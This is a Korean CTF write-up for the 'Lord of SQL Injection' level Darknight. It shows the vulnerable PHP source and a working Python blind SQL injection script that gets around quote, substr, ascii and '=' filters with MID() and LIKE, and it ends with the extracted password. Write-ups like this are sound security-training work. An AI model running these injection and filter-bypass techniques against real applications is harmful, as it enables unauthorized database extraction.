# Lord of SQL Injection No.12 Darknight

Darknight 문제는 `'`, `substr`, `ascii`, `=` 를 사용하지 않고 Blind SQL injection을 하도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe"); 
  $query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_darkknight where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight"); 
  highlight_file(__FILE__); 
?>
```
```php
if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
if(preg_match('/\'|substr|ascii|=/i', $_GET[no])) exit("HeHe");
```

`preg_match` 함수에서 `'`, `substr`, `ascii`, `=` 을 필터링하면 `HeHe`를 출력하고 문제 풀이에 실패하게 된다.

```php
$query = "select id from prob_darkknight where id='guest' and pw='{$_GET[pw]}' and no={$_GET[no]}"; 
```

`'` 를 필터링하기 때문에 이전에 계속 사용해왔던 방식인 `$_GET[pw]`를 `'`로 닫고 `or`문으로 원하는 값을 추출해 내는 방법을 사용할 수가 없다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("darkknight");
```

DB에 저장된 `pw` 값과 입력받은 `pw` 값이 일치하면 문제 풀이에 성공하게 된다.

## Solution

```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수
pwlen = 0

for i in range(1,10):
    url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
    add_url = '-1 or length(pw) like {} -- ;'.format(i)
    print("Searching Password Length.. [{}]".format(i))
    add_url = quote(add_url)
    new_url = url + add_url
    re = urllib.request.Request(new_url)
    re.add_header("User-Agent","Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
    response = urllib.request.urlopen(re)

    if str(response.read()).find("Hello admin") != -1:
        pwlen = i
        print("Found length!! => {}".format(pwlen))
        break

for i in range(1,pwlen+1):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/darkknight_f76e2eebfeeeec2b7699a9ae976f574d.php?no="
        add_url = '-1 or MID(pw,1,{}) like "{}" -- ;'.format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        request = urllib.request.urlopen(re)

        if str(request.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

`pw`를 입력받는 부분은 `'`를 쓸 수 없기 때문에 `'`를 이용하여 우회할 수가 없다. 그렇기 때문에 `pw` 뒤에 나오는 `$_GET[no]`를 이용하여 문제를 풀 수 있다.

`no=-1`을 이용하여 다음 or 연산을 무조건 실행시키게 만든다.

이전 문제에서는 `substr`과 함께 `()`까지 함께 묶어 `substr()`를 필터링했기 때문에 `substring()`으로 우회가 가능했다.
하지만 이번 문제에서는 `substr`이라는 문자열 자체만을 필터링하기 때문에 `substring()`을 사용한 우회가 불가능하다.
`substr`을 우회하기 위해 사용한 함수는 이전 코드에서도 사용했던 `MID()` 함수이다.

* [MID 함수를 사용한 No.11 Golem Writeup 보러가기](https://github.com/JaehunYoon/los_writeup/blob/master/los_no11_golem.md)

`=`을 우회하기 위해 이전 문제와 같이 `like`를 사용하였다.

`for`문이 끝나면 `pw`값은 `1c62ba6f`가 나오게 된다.

```
http://los.eagle-jump.org/darkknight_***.php?pw=1c62ba6f
```

URL에 추출한 `pw`값인 `1c62ba6f`를 삽입하면 DB의 `pw` 값과 일치하기 때문에 문제 풀이에 성공하게 된다.